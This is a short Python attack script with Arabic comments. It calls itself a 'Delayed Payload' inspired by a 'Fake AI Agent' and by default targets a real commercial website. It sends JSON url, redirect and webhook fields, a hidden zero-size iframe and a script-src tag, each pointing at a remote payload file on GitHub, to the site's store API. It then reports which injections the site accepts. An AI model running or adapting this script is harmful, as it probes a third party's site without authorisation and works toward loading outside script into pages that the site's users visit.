#!/usr/bin/env python3
"""
🎭 Delayed Payload - مستوحى من Fake AI Agent
يخفي الـ payload في رابط خارجي
"""
import requests, sys, json, os, time, base64

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://beeorder.com"
EXTERNAL = "https://raw.githubusercontent.com/Sham4753/al-bayan-compiler/main/payload.txt"

print(f"🎭 Delayed Payload: {TARGET}")
print("═" * 50)

# 1. فحص إذا كان الموقع يقبل روابط خارجية
print("\n1️⃣ فحص External Link:")
payloads = [
    f'{{"url":"{EXTERNAL}"}}',
    f'{{"redirect":"{EXTERNAL}"}}',
    f'{{"webhook":"{EXTERNAL}"}}',
]

for p in payloads:
    try:
        r = requests.post(f"{TARGET}/api/stores", data=p, timeout=5)
        if r.status_code == 200:
            print(f"   🚨 Accepts external: {p[:50]}")
    except:
        pass

# 2. فحص iframe injection
print("\n2️⃣ فحص iframe:")
payload = f'<iframe src="{EXTERNAL}" width="0" height="0">'
try:
    r = requests.get(f"{TARGET}/api/stores?q={payload}", timeout=5)
    if "iframe" in r.text.lower():
        print("   🚨 iframe accepted")
except:
    pass

# 3. فحص script src
print("\n3️⃣ فحص script src:")
payload = f'<script src="{EXTERNAL}">'
try:
    r = requests.get(f"{TARGET}/api/stores?q={payload}", timeout=5)
    if "script" in r.text.lower():
        print("   🚨 script src accepted")
except:
    pass

print("\n✅ اكتمل")
